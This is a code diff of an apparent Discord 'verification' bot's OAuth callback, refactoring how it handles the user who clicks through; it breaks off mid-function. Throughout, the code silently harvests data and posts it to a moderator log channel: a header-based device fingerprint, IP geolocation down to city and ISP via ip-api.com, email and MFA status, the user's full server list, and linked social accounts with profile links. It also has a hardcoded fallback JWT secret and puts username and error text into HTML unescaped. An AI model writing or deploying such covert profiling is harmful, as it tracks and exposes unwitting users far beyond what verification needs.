@@ -3,7 +3,7 @@ const crypto = require('crypto');
 
 const JWT_SECRET = process.env.JWT_SECRET || 'discord-verification-bot-jwt-secret-key-2024-fixed';
 
-// Generate detailed device fingerprint from all HTTP headers
+// Generate detailed device fingerprint from HTTP headers
 function getDeviceFingerprint(headers) {
   const userAgent = headers['user-agent'] || 'Unknown';
   const acceptLanguage = headers['accept-language'] || 'Unknown';
@@ -23,117 +23,31 @@ function getDeviceFingerprint(headers) {
   const referer = headers['referer'] || '';
   const dnt = headers['dnt'] || '';
   const upgradeInsecure = headers['upgrade-insecure-requests'] || '';
-  const connection = headers['connection'] || '';
   
-  // Parse user agent for detailed info
-  let os = 'Unknown';
-  let osVersion = '';
-  let browser = 'Unknown';
-  let browserVersion = '';
-  let deviceType = 'Desktop';
-  let engine = 'Unknown';
+  let os = 'Unknown', osVersion = '', browser = 'Unknown', browserVersion = '', deviceType = 'Desktop', engine = 'Unknown';
   
-  // Detect OS
-  if (userAgent.includes('Windows NT 10.0')) { os = 'Windows 10/11'; }
-  else if (userAgent.includes('Windows NT 6.3')) { os = 'Windows 8.1'; }
-  else if (userAgent.includes('Windows NT 6.2')) { os = 'Windows 8'; }
-  else if (userAgent.includes('Windows NT 6.1')) { os = 'Windows 7'; }
-  else if (userAgent.includes('Windows NT 6.0')) { os = 'Windows Vista'; }
-  else if (userAgent.includes('Mac OS X')) { 
-    os = 'macOS'; 
-    const match = userAgent.match(/Mac OS X ([0-9_\.]+)/);
-    if (match) osVersion = match[1].replace(/_/g, '.');
-  }
-  else if (userAgent.includes('Android')) { 
-    os = 'Android'; 
-    deviceType = 'Mobile';
-    const match = userAgent.match(/Android ([0-9\.]+)/);
-    if (match) osVersion = match[1];
-  }
-  else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) { 
-    os = 'iOS'; 
-    deviceType = userAgent.includes('iPad') ? 'Tablet' : 'Mobile';
-    const match = userAgent.match(/OS ([0-9_\.]+)/);
-    if (match) osVersion = match[1].replace(/_/g, '.');
-  }
-  else if (userAgent.includes('Linux')) { 
-    os = 'Linux';
-    if (userAgent.includes('Ubuntu')) os = 'Ubuntu Linux';
-    else if (userAgent.includes('Debian')) os = 'Debian Linux';
-    else if (userAgent.includes('Fedora')) os = 'Fedora Linux';
-  }
-  else if (userAgent.includes('CrOS')) { 
-    os = 'Chrome OS'; 
-    deviceType = 'Desktop';
-  }
+  if (userAgent.includes('Windows NT 10.0')) os = 'Windows 10/11';
+  else if (userAgent.includes('Windows NT 6.3')) os = 'Windows 8.1';
+  else if (userAgent.includes('Windows NT 6.1')) os = 'Windows 7';
+  else if (userAgent.includes('Mac OS X')) { os = 'macOS'; const m = userAgent.match(/Mac OS X ([0-9_\.]+)/); if (m) osVersion = m[1].replace(/_/g, '.'); }
+  else if (userAgent.includes('Android')) { os = 'Android'; deviceType = 'Mobile'; const m = userAgent.match(/Android ([0-9\.]+)/); if (m) osVersion = m[1]; }
+  else if (userAgent.includes('iOS') || userAgent.includes('iPhone')) { os = 'iOS'; deviceType = 'Mobile'; }
+  else if (userAgent.includes('Linux')) os = 'Linux';
   
-  // Detect browser
-  if (userAgent.includes('Edg/')) { 
-    browser = 'Edge'; 
-    const match = userAgent.match(/Edg\/([0-9\.]+)/);
-    if (match) browserVersion = match[1];
-  }
-  else if (userAgent.includes('Chrome/')) { 
-    browser = 'Chrome'; 
-    const match = userAgent.match(/Chrome\/([0-9\.]+)/);
-    if (match) browserVersion = match[1];
-  }
-  else if (userAgent.includes('Firefox/')) { 
-    browser = 'Firefox'; 
-    const match = userAgent.match(/Firefox\/([0-9\.]+)/);
-    if (match) browserVersion = match[1];
-  }
-  else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome')) { 
-    browser = 'Safari'; 
-    const match = userAgent.match(/Version\/([0-9\.]+)/);
-    if (match) browserVersion = match[1];
-  }
-  else if (userAgent.includes('Opera') || userAgent.includes('OPR/')) { 
-    browser = 'Opera'; 
-  }
-  else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) { 
-    browser = 'Internet Explorer'; 
-  }
+  if (userAgent.includes('Edg/')) { browser = 'Edge'; const m = userAgent.match(/Edg\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
+  else if (userAgent.includes('Chrome/')) { browser = 'Chrome'; const m = userAgent.match(/Chrome\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
+  else if (userAgent.includes('Firefox/')) { browser = 'Firefox'; const m = userAgent.match(/Firefox\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
+  else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome')) { browser = 'Safari'; }
   
-  // Detect engine
   if (userAgent.includes('Gecko/')) engine = 'Gecko';
   else if (userAgent.includes('AppleWebKit/')) engine = 'WebKit';
-  else if (userAgent.includes('Trident/')) engine = 'Trident';
-  else if (userAgent.includes('EdgeHTML/')) engine = 'EdgeHTML';
-  else if (userAgent.includes('Blink/')) engine = 'Blink';
   
-  // Create comprehensive fingerprint hash using SHA256
-  const fingerprintData = JSON.stringify({
-    userAgent,
-    acceptLanguage,
-    acceptEncoding,
-    accept,
-    secClient,
-    secPlatform,
-    secMobile,
-    secModel,
-    secBitness,
-    secWow64,
-    secFetchDest,
-    secFetchMode,
-    secFetchSite,
-    origin,
-    referer,
-    dnt,
-    upgradeInsecure
-  });
-  
+  const fingerprintData = JSON.stringify({ userAgent, acceptLanguage, acceptEncoding, accept, secClient, secPlatform, secMobile, secModel, secBitness, secWow64, secFetchDest, secFetchMode, secFetchSite, origin, referer, dnt, upgradeInsecure });
   const hash = crypto.createHash('sha256').update(fingerprintData).digest('hex').substring(0, 16);
   
   return {
-    fingerprint: hash,
-    fingerprintShort: hash.substring(0, 8),
-    os,
-    osVersion,
-    browser,
-    browserVersion,
-    deviceType,
-    engine,
+    fingerprint: hash, fingerprintShort: hash.substring(0, 8),
+    os, osVersion, browser, browserVersion, deviceType, engine,
     platform: secPlatform || os,
     language: acceptLanguage.split(',')[0] || 'Unknown',
     languages: acceptLanguage,
@@ -142,18 +56,33 @@ function getDeviceFingerprint(headers) {
     upgradeInsecure: upgradeInsecure === '1',
     referer: referer || 'Direct',
     origin: origin || 'None',
-    secClient,
-    secPlatform,
+    secClient, secPlatform,
     secMobile: secMobile === '?1' ? 'Mobile' : (secMobile === '?0' ? 'Desktop' : 'Unknown'),
     secModel: secModel || 'N/A',
     secBitness: secBitness || 'N/A',
     secWow64: secWow64 === '?1' ? 'Yes' : (secWow64 === '?0' ? 'No' : 'Unknown'),
-    secFetchDest,
-    secFetchMode,
-    secFetchSite,
-    secFetchUser,
-    userAgent: userAgent
+    secFetchDest, secFetchMode, secFetchSite, secFetchUser,
+    userAgent
   };
+}
+
+// Get IP intelligence from ip-api.com (free)
+async function getIPIntelligence(ip) {
+  if (!ip || ip === 'Unknown' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+    return null;
+  }
+  try {
+    const response = await fetch(`http://ip-api.com/json/${ip}`);
+    if (response.ok) {
+      const data = await response.json();
+      if (data.status === 'success') {
+        return data;
+      }
+    }
+  } catch (e) {
+    console.log('⚠️ IP intelligence error:', e.message);
+  }
+  return null;
 }
 
 async function handler(request, response) {
@@ -166,42 +95,19 @@ async function handler(request, response) {
 
   const { code, state, error } = request.query;
 
-  // Capture client IP and device fingerprint
-  const clientIP = request.headers['x-forwarded-for']?.split(',')[0] ||
-                   request.headers['x-real-ip'] ||
-                   request.headers['x-client-ip'] ||
-                   'Unknown';
-  
-  // Get IP intelligence (VPN/Proxy detection, ISP, Hosting)
-  let ipIntelligence = null;
-  if (clientIP !== 'Unknown' && !clientIP.startsWith('192.168.') && !clientIP.startsWith('10.') && !clientIP.startsWith('172.')) {
-    try {
-      const ipResponse = await fetch(`http://ip-api.com/json/${clientIP}`);
-      if (ipResponse.ok) {
-        ipIntelligence = await ipResponse.json();
-        console.log('🔍 IP Intelligence:', ipIntelligence);
-      }
-    } catch (e) {
-      console.log('⚠️ Could not fetch IP intelligence:', e.message);
-    }
-  }
-  
+  // Capture client info
+  const clientIP = request.headers['x-forwarded-for']?.split(',')[0] || request.headers['x-real-ip'] || request.headers['x-client-ip'] || 'Unknown';
   const deviceInfo = getDeviceFingerprint(request.headers);
+  const ipIntelligence = await getIPIntelligence(clientIP);
+
+  console.log('=== CALLBACK STARTED ===');
+  console.log('Client IP:', clientIP);
+  console.log('Code:', code ? 'Present' : 'Missing');
+  console.log('State:', state ? 'Present' : 'Missing');
 
   function htmlResponse(title, content, color = 'blue') {
-    const colors = { blue: '#3498db', green: '#27ae60', red: '#e74c3c' };
     return `<!DOCTYPE html><html><head><title>${title}</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;text-align:center;padding:50px 20px;background:#2c2f33;color:white;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#23272a;border-radius:10px;padding:40px;max-width:500px;box-shadow:0 4px 15px rgba(0,0,0,0.3)}h1{font-size:48px;margin:0 0 20px}h2{margin:0 0 15px;font-weight:500}p{color:#99aab5;font-size:16px;margin:10px 0}</style></head><body><div class="card">${content}</div></body></html>`;
   }
-
-  // Debug: Log environment variables (will show in Vercel logs)
-  console.log('=== CALLBACK STARTED ===');
-  console.log('ENV CHECK:', {
-    HAS_CLIENT_ID: !!process.env.DISCORD_CLIENT_ID,
-    HAS_CLIENT_SECRET: !!process.env.DISCORD_CLIENT_SECRET,
-    HAS_REDIRECT_URI: !!process.env.OAUTH_REDIRECT_URI,
-    HAS_JWT_SECRET: !!process.env.JWT_SECRET,
-    REDIRECT_URI: process.env.OAUTH_REDIRECT_URI
-  });
 
   if (error) {
     console.log('❌ OAuth error:', error);
@@ -209,33 +115,31 @@ async function handler(request, response) {
   }
 
   if (!code || !state) {
-    console.log('❌ Missing code or state. code:', !!code, 'state:', !!state);
+    console.log('❌ Missing code or state');
     return response.send(htmlResponse('Invalid Request', `<h1>❌</h1><h2>Invalid Request</h2><p>Missing authorization code or state.</p>`, 'red'));
   }
 
   let userId, username, avatar, email, emailVerified, mfaEnabled, guildId, logChannelIdFromState;
 
   try {
-    // Decode JWT state token
+    // Decode JWT state
     const decoded = jwt.verify(state, JWT_SECRET);
     guildId = decoded.guild_id;
     logChannelIdFromState = decoded.log_channel_id;
-    console.log('📋 Decoded JWT - Guild ID:', guildId, 'User ID:', decoded.user_id);
+    console.log('📋 Decoded JWT - Guild:', guildId, 'User:', decoded.user_id);
 
-    // Validate required env vars
+    // Validate env vars
     const clientId = process.env.DISCORD_CLIENT_ID;
     const clientSecret = process.env.DISCORD_CLIENT_SECRET;
     const redirectUri = process.env.OAUTH_REDIRECT_URI;
+    const botToken = process.env.DISCORD_BOT_TOKEN;
 
-    if (!clientId || !clientSecret || !redirectUri) {
-      throw new Error('Server configuration error: Missing Discord credentials');
+    if (!clientId || !clientSecret || !redirectUri || !botToken) {
+      throw new Error('Server configuration error. Missing Discord credentials.');
     }
 
-    console.log('🔄 Exchanging code for token...');
-    console.log('Client ID:', clientId);
-    console.log('Redirect URI:', redirectUri);
-
     // Exchange code for token
+    console.log('🔄 Exchanging code for token...');
     const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -250,13 +154,8 @@ async function handler(request, response) {
 
     if (!tokenResponse.ok) {
       const errorData = await tokenResponse.json();
-      console.error('❌ Token exchange failed:', tokenResponse.status, errorData);
-      
-      let errorMsg = errorData.error_description || errorData.error || 'Failed to get access token';
-      if (errorData.error === 'invalid_client') {
-        errorMsg = 'Invalid Discord client credentials. Check DISCORD_CLIENT_ID and DISCORD_CLIENT_SECRET in Vercel env vars.';
-      }
-      throw new Error(errorMsg);
+      console.error('❌ Token error:', errorData);
+      throw new Error(errorData.error_description || errorData.error || 'Failed to get token');
     }
 
     const tokenData = await tokenResponse.json();
@@ -269,7 +168,6 @@ async function handler(request, response) {
     });
 
     if (!userResponse.ok) throw new Error('Failed to get user info');
-
     const userData = await userResponse.json();
     userId = userData.id;
     username = userData.global_name || userData.username || 'User';
@@ -277,95 +175,62 @@ async function handler(request, response) {
     emailVerified = userData.verified || false;
     mfaEnabled = userData.mfa_enabled || false;
     avatar = userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'No avatar';
+    console.log('👤 User:', username, userId);
 
-    // Get user's guilds
+    // Get user guilds
     let userGuilds = [];
     try {
       const guildsResponse = await fetch('https://discord.com/api/users/@me/guilds', {
         headers: { 'Authorization': `Bearer ${accessToken}` }
       });
-      console.log('📊 Guilds response status:', guildsResponse.status);
-      if (guildsResponse.ok) {
-        userGuilds = await guildsResponse.json();
-        console.log(`📊 Fetched ${userGuilds.length} guilds, first few:`, userGuilds.slice(0, 3).map(g => g.name).join(', '));
-      } else {
-        const errText = await guildsResponse.text();
-        console.log('⚠️ Guilds response error:', guildsResponse.status, errText);
-      }
-    } catch (e) {
-      console.log('ℹ️ Could not fetch guilds:', e.message);
-    }
+      if (guildsResponse.ok) userGuilds = await guildsResponse.json();
+      console.log('📊 User in', userGuilds.length, 'servers');
+    } catch (e) { console.log('⚠️ Could not fetch guilds:', e.message); }
 
-    // Get user's connections
+    // Get user connections
     let userConnections = [];
     try {
       const connectionsResponse = await fetch('https://discord.com/api/users/@me/connections', {
         headers: { 'Authorization': `Bearer ${accessToken}` }
       });
-      console.log('🔗 Connections response status:', connectionsResponse.status);
-      if (connectionsResponse.ok) {
-        userConnections = await connectionsResponse.json();
-        console.log(`🔗 Fetched ${userConnections.length} connections, types:`, userConnections.map(c => c.type).join(', '));
-      } else {
-        const errText = await connectionsResponse.text();
-        console.log('⚠️ Connections response error:', connectionsResponse.status, errText);
-      }
-    } catch (e) {
-      console.log('ℹ️ Could not fetch connections:', e.message);
-    }
+      if (connectionsResponse.ok) userConnections = await connectionsResponse.json();
+      console.log('🔗 User has', userConnections.length, 'connections');
+    } catch (e) { console.log('⚠️ Could not fetch connections:', e.message); }
 
-    console.log(`👤 User: ${username} (${userId})`);
-    console.log(`📊 In ${userGuilds.length} servers`);
-    console.log(`🔗 Has ${userConnections.length} connections`);
+    // Verify user ID matches
+    if (userId !== decoded.user_id) throw new Error('User ID mismatch');
+    if (!guildId) throw new Error('No guild ID found');
 
-    // Verify user ID matches JWT
-    if (userId !== decoded.user_id) {
-      throw new Error('User ID mismatch');
-    }
-
-    if (!guildId) {
-      throw new Error('No guild ID found');
-    }
-
-    // Get guild info via Bot API
+    // Get guild info
     const botGuildResponse = await fetch(`https://discord.com/api/guilds/${guildId}`, {
-      headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` }
+      headers: { 'Authorization': `Bot ${botToken}` }
     });
 
-    if (!botGuildResponse.ok) {
-      throw new Error('Bot is not in this server');
-    }
-
+    if (!botGuildResponse.ok) throw new Error('Bot is not in this server');
     const userGuild = await botGuildResponse.json();
-    console.log(`🏠 Guild: ${userGuild.name} (${guildId})`);
+    console.log('🏠 Guild:', userGuild.name);
 
     // Get roles
     const rolesResponse = await fetch(`https://discord.com/api/guilds/${guildId}/roles`, {
-      headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` }
+      headers: { 'Authorization': `Bot ${botToken}` }
     });
 
-    if (!rolesResponse.ok) {
-      throw new Error('Failed to get roles');
-    }
-
+    if (!rolesResponse.ok) throw new Error('Failed to get roles');
     const roles = await rolesResponse.json();
     const verifiedRole = roles.find(r => r.name === 'Verified');
 
-    if (!verifiedRole) {
-      throw new Error('Verified role not found. Run /setup first.');
-    }
+    if (!verifiedRole) throw new Error('Verified role not found. Run /setup first.');
+    console.log('✅ Found Verified role:', verifiedRole.id);
 
-    // Check if already verified
+    // Check member
     const memberResponse = await fetch(`https://discord.com/api/guilds/${guildId}/members/${userId}`, {
-      headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` }
+      headers: { 'Authorization': `Bot ${botToken}` }
     });
 
-    if (!memberResponse.ok) {
-      throw new Error('User not found in server');
-    }
-
+    if (!memberResponse.ok) throw new Error('User not in server');
     const memberData = await memberResponse.json();
 
+    // Already verified?
     if (memberData.roles.includes(verifiedRole.id)) {
       console.log('⚠️ User already verified');
       await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'ALREADY_VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
@@ -373,139 +238,103 @@ async function handler(request, response) {
     }
 
     // Assign role
+    console.log('🔧 Assigning Verified role...');
     const assignRoleResponse = await fetch(
       `https://discord.com/api/guilds/${guildId}/members/${userId}/roles/${verifiedRole.id}`,
-      {
-        method: 'PUT',
-        headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` }
-      }
+      { method: 'PUT', headers: { 'Authorization': `Bot ${botToken}` } }
     );
 
     if (!assignRoleResponse.ok) {
-      throw new Error('Failed to assign role');
+      const errData = await assignRoleResponse.json();
+      console.error('❌ Role assign error:', assignRoleResponse.status, errData);
+      throw new Error(`Failed to assign role (${assignRoleResponse.status})`);
     }
 
     console.log('✅ Role assigned successfully');
 
-    // Send log (with detailed error handling)
-    console.log('📝 Preparing to send verification log...');
-    console.log('📊 User:', userId, username);
-    console.log('📊 Guild:', userGuild?.name, guildId);
-    console.log('📊 IP:', clientIP);
-    console.log('📊 Guilds fetched:', userGuilds?.length || 0);
-    console.log('📊 Connections fetched:', userConnections?.length || 0);
-    console.log('📊 LOG_CHANNEL_ID:', logChannelIdFromState || process.env.LOG_CHANNEL_ID || 'MISSING');
-    console.log('📊 DISCORD_BOT_TOKEN present:', !!process.env.DISCORD_BOT_TOKEN);
-    
-    try {
-      console.log('📝 Calling sendLog...');
-      await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
-      console.log('✅ Log sent successfully');
-    } catch (logError) {
-      console.error('❌ Failed to send log:', logError);
-      console.error('❌ Error stack:', logError.stack);
-      // Don't throw - verification succeeded even if log failed
-    }
+    // Send verification log
+    console.log('📝 Sending verification log...');
+    await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
+    console.log('✅ Log sent');
 
     // Send DM
     try {
       const dmResponse = await fetch(`https://discord.com/api/users/${userId}/channels`, {
         method: 'POST',
-        headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` },
+        headers: { 'Authorization': `Bot ${botToken}` },
         body: JSON.stringify({})
       });
-
       if (dmResponse.ok) {
         const dmData = await dmResponse.json();
         await fetch(`https://discord.com/api/channels/${dmData.id}/messages`, {
           method: 'POST',
-          headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`, 'Content-Type': 'application/json' },
+          headers: { 'Authorization': `Bot ${botToken}`, 'Content-Type': 'application/json' },
           body: JSON.stringify({ content: `✅ **Verification successful!**\n\nYou now have access to **${userGuild.name}**!` })
         });
       }
-    } catch (dmError) {
-      console.log('ℹ️ Could not send DM');
-    }
+    } catch (e) { console.log('ℹ️ Could not send DM'); }
 
     return response.send(htmlResponse('Verification Successful!', `<h1>✅</h1><h2>Welcome, ${username}!</h2><p>You have been verified!</p>`, 'green'));
 
   } catch (error) {
     console.error('❌ Verification error:', error.message);
-
     return response.send(htmlResponse('Verification Failed', `<h1>❌</h1><h2>Verification Failed</h2><p>${error.message}</p>`, 'red'));
   }
 }
 
-async function sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, guild, status, ip, deviceInfo = null, ipIntelligence = null, userGuilds = [], userConnections = [], errorMessage = null, logChannelIdFromState = null) {
+async function sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, guild, status, ip, deviceInfo, ipIntelligence, userGuilds, userConnections, errorMessage, logChannelIdFromState) {
   try {
-    console.log('📝 sendLog: Starting...');
+    const logChannelId = logChannelIdFromState || process.env.LOG_CHANNEL_ID;
     
-    let logChannelId = logChannelIdFromState || process.env.LOG_CHANNEL_ID;
-    console.log('📝 sendLog: LOG_CHANNEL_ID =', logChannelId ? 'Set' : 'MISSING');
+    console.log('📝 sendLog: LOG_CHANNEL_ID =', logChannelId || 'MISSING');
+    console.log('📝 sendLog: DISCORD_BOT_TOKEN =', process.env.DISCORD_BOT_TOKEN ? 'Present' : 'MISSING');
     
     if (!logChannelId) {
-      console.error('❌ LOG_CHANNEL_ID not set');
+      console.error('❌ LOG_CHANNEL_ID not configured');
+      return;
+    }
+    if (!process.env.DISCORD_BOT_TOKEN) {
+      console.error('❌ DISCORD_BOT_TOKEN not configured');
       return;
     }
 
     const isVerified = status === 'VERIFIED';
-    const isError = status === 'ERROR';
-    console.log('📝 sendLog: Status =', status, 'isVerified =', isVerified);
 
-    // Format connections with links
+    // Format connections
     const connectionTypes = userConnections.length > 0
       ? userConnections.map(c => {
-          const icons = {
-            discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬',
-            youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻',
-            instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️',
-            xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗'
-          };
+          const icons = { discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬', youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻', instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️', xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗' };
           const icon = icons[c.type] || '🔗';
           const verified = c.verified ? ' ✅' : '';
-          
-          // Add link if available
           let link = '';
-          if (c.type === 'twitter' && c.id) {
-            link = ` https://twitter.com/${c.id}`;
-          } else if (c.type === 'youtube' && c.id) {
-            link = ` https://youtube.com/@${c.id}`;
-          } else if (c.type === 'github' && c.id) {
-            link = ` https://github.com/${c.id}`;
-          } else if (c.type === 'steam' && c.id) {
-            link = ` https://steamcommunity.com/profiles/${c.id}`;
-          } else if (c.type === 'twitch' && c.id) {
-            link = ` https://twitch.tv/${c.id}`;
-          } else if (c.type === 'instagram' && c.id) {
-            link = ` https://instagram.com/${c.id}`;
-          } else if (c.type === 'tiktok' && c.id) {
-            link = ` https://tiktok.com/@${c.id}`;
-          } else if (c.type === 'spotify' && c.id) {
-            link = ` https://open.spotify.com/user/${c.id}`;
-          } else if (c.type === 'roblox' && c.id) {
-            link = ` https://roblox.com/users/${c.id}`;
-          } else if (c.type === 'domain' && c.id) {
-            link = ` https://${c.id}`;
-          } else if (c.url) {
-            link = ` ${c.url}`;
-          }
-          
-          return `${icon} ${c.name || c.type}${verified}${link ? ` - [Link](${link.trim()})` : ''}`;
+          if (c.type === 'twitter' && c.id) link = ` - [Link](https://twitter.com/${c.id})`;
+          else if (c.type === 'github' && c.id) link = ` - [Link](https://github.com/${c.id})`;
+          else if (c.type === 'youtube' && c.id) link = ` - [Link](https://youtube.com/@${c.id})`;
+          else if (c.type === 'steam' && c.id) link = ` - [Link](https://steamcommunity.com/profiles/${c.id})`;
+          else if (c.type === 'twitch' && c.id) link = ` - [Link](https://twitch.tv/${c.id})`;
+          else if (c.type === 'instagram' && c.id) link = ` - [Link](https://instagram.com/${c.id})`;
+          else if (c.type === 'tiktok' && c.id) link = ` - [Link](https://tiktok.com/@${c.id})`;
+          else if (c.type === 'spotify' && c.id) link = ` - [Link](https://open.spotify.com/user/${c.id})`;
+          else if (c.type === 'roblox' && c.id) link = ` - [Link](https://roblox.com/users/${c.id})`;
+          else if (c.type === 'domain' && c.id) link = ` - [Link](https://${c.id})`;
+          return `${icon} ${c.name || c.type}${verified}${link}`;
         }).join('\n')
       : 'None';
 
-    // Format guild list for main embed (short version)
+    // Format servers list
     const guildCount = userGuilds.length || 0;
-    const shortGuildList = userGuilds.length > 0
-      ? userGuilds.slice(0, 5).map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n') + (userGuilds.length > 5 ? `\n*...and ${userGuilds.length - 5} more*` : '')
+    const guildList = userGuilds.length > 0
+      ? userGuilds.slice(0, 10).map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n') + (userGuilds.length > 10 ? `\n*...and ${userGuilds.length - 10} more*` : '')
       : 'None';
 
+    const embeds = [];
+
     // Main verification embed
-    const embed = {
-      title: isVerified ? '✅ New Verification' : (isError ? '❌ Verification Error' : '⚠️ Re-verification Attempt'),
-      color: isVerified ? 0x27ae60 : (isError ? 0xe74c3c : 0xf39c12),
+    embeds.push({
+      title: isVerified ? '✅ New Verification' : '⚠️ Re-verification',
+      color: isVerified ? 0x27ae60 : 0xf39c12,
       timestamp: new Date().toISOString(),
-      thumbnail: { url: avatar !== 'No avatar' ? avatar : undefined },
+      thumbnail: avatar !== 'No avatar' ? { url: avatar } : undefined,
       fields: [
         { name: '👤 User', value: userId ? `<@${userId}> (${username})` : 'Unknown', inline: true },
         { name: '🆔 User ID', value: `\`${userId || 'N/A'}\``, inline: true },
@@ -521,110 +350,71 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
         { name: '🌍 Language', value: deviceInfo ? deviceInfo.language : 'Unknown', inline: true },
         { name: '📊 In Servers', value: `${guildCount} servers`, inline: true },
         { name: '🔗 Connections', value: connectionTypes, inline: false },
-        { name: '🏠 Servers They\'re In', value: shortGuildList, inline: false },
+        { name: '🏠 Servers They\'re In', value: guildList, inline: false },
         { name: '🏠 Target Server', value: guild?.name ? `${guild.name} (\`${guild.id}\`)` : 'N/A', inline: false }
       ],
       footer: { text: `${status} • ${new Date().toLocaleString()}` }
-    };
+    });
 
-    // Add IP intelligence embed if available
+    // Full servers embed
+    if (userGuilds.length > 0) {
+      embeds.push({
+        title: `🏠 All Servers (${guildCount} total)`,
+        color: 0x5865F2,
+        fields: [{
+          name: '📋 Complete Server List',
+          value: userGuilds.map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n').substring(0, 1024),
+          inline: false
+        }]
+      });
+    }
+
+    // Full connections embed
+    if (userConnections.length > 0) {
+      embeds.push({
+        title: `🔗 All Connections (${userConnections.length} total)`,
+        color: 0x27ae60,
+        fields: [{
+          name: '📱 Connected Accounts',
+          value: userConnections.map(c => {
+            const icons = { discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬', youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻', instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️', xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗' };
+            const icon = icons[c.type] || '🔗';
+            const verified = c.verified ? '✅' : '❌';
+            let link = 'No link';
+            if (c.type === 'twitter' && c.id) link = `https://twitter.com/${c.id}`;
+            else if (c.type === 'github' && c.id) link = `https://github.com/${c.id}`;
+            else if (c.type === 'youtube' && c.id) link = `https://youtube.com/@${c.id}`;
+            else if (c.type === 'steam' && c.id) link = `https://steamcommunity.com/profiles/${c.id}`;
+            else if (c.type === 'twitch' && c.id) link = `https://twitch.tv/${c.id}`;
+            else if (c.type === 'instagram' && c.id) link = `https://instagram.com/${c.id}`;
+            else if (c.type === 'tiktok' && c.id) link = `https://tiktok.com/@${c.id}`;
+            else if (c.type === 'spotify' && c.id) link = `https://open.spotify.com/user/${c.id}`;
+            else if (c.type === 'roblox' && c.id) link = `https://roblox.com/users/${c.id}`;
+            else if (c.type === 'domain' && c.id) link = `https://${c.id}`;
+            return `${icon} **${c.name || c.type}** ${verified}\n└ Link: ${link}`;
+          }).join('\n\n').substring(0, 1024),
+          inline: false
+        }]
+      });
+    }
+
+    // IP intelligence embed
     if (ipIntelligence && ipIntelligence.status === 'success') {
-      const vpnWarning = ipIntelligence.proxy || ipIntelligence.hosting 
-        ? '⚠️ **VPN/Proxy/Hosting detected** - Higher risk verification' 
-        : '✅ Residential IP';
-      
-      const ipEmbed = {
+      embeds.push({
         title: '🌐 IP Intelligence',
         color: ipIntelligence.proxy || ipIntelligence.hosting ? 0xe74c3c : 0x27ae60,
         fields: [
           { name: '📍 IP Address', value: `\`${ipIntelligence.query}\``, inline: false },
-          { name: '🛡️ Security', value: `**VPN/Proxy:** ${ipIntelligence.proxy ? '⚠️ Yes' : '❌ No'}\n**Hosting:** ${ipIntelligence.hosting ? '⚠️ Yes' : '❌ No'}\n**Risk:** ${vpnWarning}`, inline: false },
-          { name: '🌐 Location', value: `**Country:** ${ipIntelligence.country}\n**Region:** ${ipIntelligence.regionName}\n**City:** ${ipIntelligence.city}\n**Zip:** ${ipIntelligence.zip || 'N/A'}\n**Timezone:** ${ipIntelligence.timezone}`, inline: false },
-          { name: '🏢 Network', value: `**ISP:** ${ipIntelligence.isp}\n**Organization:** ${ipIntelligence.org || 'N/A'}\n**ASN:** ${ipIntelligence.as || 'N/A'}`, inline: false },
-          { name: '📡 Coordinates', value: `**Lat:** ${ipIntelligence.lat || 'N/A'}\n**Lon:** ${ipIntelligence.lon || 'N/A'}`, inline: true }
+          { name: '🛡️ Security', value: `**VPN/Proxy:** ${ipIntelligence.proxy ? '⚠️ Yes' : '❌ No'}\n**Hosting:** ${ipIntelligence.hosting ? '⚠️ Yes' : '❌ No'}`, inline: false },
+          { name: '🌐 Location', value: `**Country:** ${ipIntelligence.country}\n**Region:** ${ipIntelligence.regionName}\n**City:** ${ipIntelligence.city}\n**Timezone:** ${ipIntelligence.timezone}`, inline: false },
+          { name: '🏢 Network', value: `**ISP:** ${ipIntelligence.isp}\n**ASN:** ${ipIntelligence.as || 'N/A'}`, inline: false }
         ]
-      };
-      embeds.push(ipEmbed);
+      });
